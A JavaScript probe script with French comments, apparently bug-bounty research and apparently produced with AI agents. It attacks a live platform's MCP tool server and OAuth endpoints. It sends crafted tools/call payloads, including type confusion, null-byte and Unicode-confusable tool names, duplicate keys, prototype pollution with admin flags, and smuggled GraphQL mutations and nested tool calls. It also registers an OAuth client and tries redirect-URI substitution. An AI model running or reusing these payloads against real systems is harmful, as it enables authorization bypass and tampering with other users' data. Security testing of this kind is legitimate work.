// KIMI §3 / GROK §3 : confusion de type et smuggling sur tools/call (serveur MCP)
// KIMI §4b : confusion client enregistre (DCR) vs client dynamique (CIMD)
import fs from "fs";
import { ensureToken } from "/tmp/opencode/token-store.mjs";
const AS = "https://bugsecure-api.senintel.sn";
const MCP = "https://bugsecure-mcp.senintel.sn/mcp";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const { token } = await ensureToken("https://bugsecure-mcp.senintel.sn/mcp");
const H = { "Content-Type": "application/json", Accept: "application/json, text/event-stream", "User-Agent": "bb-bounty-mcp-probe/1", Authorization: "Bearer " + token };
async function raw(bodyText) {
  const r = await fetch(MCP, { method: "POST", headers: H, body: bodyText });
  const txt = await r.text();
  const line = txt.split("\n").find((l) => l.startsWith("data:"));
  let j = null; try { j = JSON.parse(line ? line.slice(5).trim() : txt); } catch { try { j = JSON.parse(txt); } catch {} }
  return { s: r.status, j, txt };
}
const brief = (r) => {
  const res = r.j?.result, err = r.j?.error;
  if (err) return "jsonrpc " + err.code + ": " + String(err.message).slice(0, 90);
  if (res?.isError) { const t = (res.content || []).map((c) => c.text).join(" ").replace(/\s+/g, " "); return "isError: " + t.slice(0, 110); }
  if (res) { const t = (res.content || []).map((c) => c.text).join(" ").replace(/\s+/g, " "); return "OK: " + t.slice(0, 110); }
  return "HTTP " + r.s + " " + r.txt.replace(/\s+/g, " ").slice(0, 100);
};
console.log("=== A) confusion de type / smuggling sur tools/call ===");
const cases = [
  ["arguments en chaine JSON", '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"get_report","arguments":"{\\"reportId\\":\\"dca04201-559b-4088-bdc3-e1666ea42461\\"}"}}'],
  ["arguments en tableau", '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"get_report","arguments":["dca04201-559b-4088-bdc3-e1666ea42461"]}}'],
  ["arguments = null", '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"get_report","arguments":null}}'],
  ["params sans arguments", '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"get_report"}}'],
  ["nom d outil avec octet nul", '{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"get_report\\u0000","arguments":{}}}'],
  ["nom d outil en confusable Unicode", '{"jsonrpc":"2.0","id":6,"method":"tools/call","params":{"name":"get_reporт","arguments":{}}}'],
  ["nom d outil en majuscules", '{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"GET_REPORT","arguments":{}}}'],
  ["double parametre name (JSON)", '{"jsonrpc":"2.0","id":8,"method":"tools/call","params":{"name":"get_report","name":"grade_report","arguments":{"reportId":"dca04201-559b-4088-bdc3-e1666ea42461"}}}'],
  ["nom d outil inconnu", '{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"__proto__","arguments":{}}}'],
  ["nom d outil = list_my_organizations (triage)", '{"jsonrpc":"2.0","id":10,"method":"tools/call","params":{"name":"list_my_organizations","arguments":{}}}'],
  ["arguments avec objet imbrique", '{"jsonrpc":"2.0","id":11,"method":"tools/call","params":{"name":"get_report","arguments":{"reportId":{"$type":"string","value":"dca04201-559b-4088-bdc3-e1666ea42461"}}}}'],
  ["arguments avec tableau sur un string", '{"jsonrpc":"2.0","id":12,"method":"tools/call","params":{"name":"get_report","arguments":{"reportId":["dca04201-559b-4088-bdc3-e1666ea42461"]}}}'],
  ["champ supplementaire (clientRequestId null)", '{"jsonrpc":"2.0","id":13,"method":"tools/call","params":{"name":"add_report_comment","arguments":{"reportId":"dca04201-559b-4088-bdc3-e1666ea42461","content":"bb-mcp-type-confusion","clientRequestId":null}}}'],
  ["champ supplementaire non declare", '{"jsonrpc":"2.0","id":14,"method":"tools/call","params":{"name":"get_report","arguments":{"reportId":"dca04201-559b-4088-bdc3-e1666ea42461","__proto__":{"admin":true},"constructor":{"prototype":{"admin":true}}}}}'],
  ["mutation GraphQL en cascade dans un argument", '{"jsonrpc":"2.0","id":15,"method":"tools/call","params":{"name":"update_my_profile","arguments":{"bio":"mutation { updateReportStatus(input:{}) { id } }"}}}'],
  ["tools/call imbrique dans un argument", '{"jsonrpc":"2.0","id":16,"method":"tools/call","params":{"name":"update_my_profile","arguments":{"bio":"{\\"jsonrpc\\":\\"2.0\\",\\"method\\":\\"tools/call\\",\\"params\\":{\\"name\\":\\"grade_report\\"}}}"}}}'],
  ["resources/read sur un outil", '{"jsonrpc":"2.0","id":17,"method":"resources/read","params":{"uri":"tool://get_report"}}'],
  ["completion/send", '{"jsonrpc":"2.0","id":18,"method":"completion/complete","params":{"ref":{"type":"ref/prompt","name":"x"},"argument":{"name":"a","value":"b"}}}'],
  ["prompts/get (inexistant)", '{"jsonrpc":"2.0","id":19,"method":"prompts/get","params":{"name":"x"}}'],
  ["logging/setLevel", '{"jsonrpc":"2.0","id":20,"method":"logging/setLevel","params":{"level":"debug"}}'],
];
for (const [lbl, body] of cases) {
  const r = await raw(body);
  console.log("  " + lbl.padEnd(40) + "HTTP " + String(r.s).padEnd(4) + brief(r));
  await sleep(400);
}

console.log("\n=== B) confusion client DCR vs client dynamique (CIMD) ===");
const form = (o) => Object.entries(o).map(([k, v]) => encodeURIComponent(k) + "=" + encodeURIComponent(v)).join("&");
const dcr = await fetch(AS + "/oauth/register", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ client_name: "bb-dcr-confusion", redirect_uris: ["http://127.0.0.1:53682/callback"], token_endpoint_auth_method: "none" }) });
const dj = await dcr.json().catch(() => ({}));
console.log("  POST /oauth/register -> HTTP " + dcr.status + " " + JSON.stringify(dj).slice(0, 160));
if (dj.client_id) {
  const u = AS + "/oauth/authorize?" + form({ response_type: "code", client_id: dj.client_id, redirect_uri: "http://127.0.0.1:53682/callback", scope: "programs:read", state: "bb-" + Date.now(), code_challenge: "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM", code_challenge_method: "S256", resource: AS });
  const r = await fetch(u, { redirect: "manual" });
  const loc = r.headers.get("location") || "";
  console.log("  authorize avec le client_id DCR (" + dj.client_id.slice(0, 16) + "…) -> HTTP " + r.status + " " + (loc.includes("/oauth/consent") ? "CONSENTEMENT (client connu)" : loc.replace("https://bugsecure.senintel.sn", "")));
  // tentative de reutiliser ce client_id comme si c etait une URL CIMD
  const u2 = AS + "/oauth/authorize?" + form({ response_type: "code", client_id: dj.client_id, redirect_uri: "https://bb-test.enseignementsecondaire.bj/cb", scope: "programs:read", state: "bb-" + Date.now(), code_challenge: "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM", code_challenge_method: "S256", resource: AS });
  const r2 = await fetch(u2, { redirect: "manual" });
  console.log("  meme client_id + redirect_uri d un autre client -> HTTP " + r2.status + " " + (r2.headers.get("location") || "").replace("https://bugsecure.senintel.sn", ""));
  await sleep(500);
}
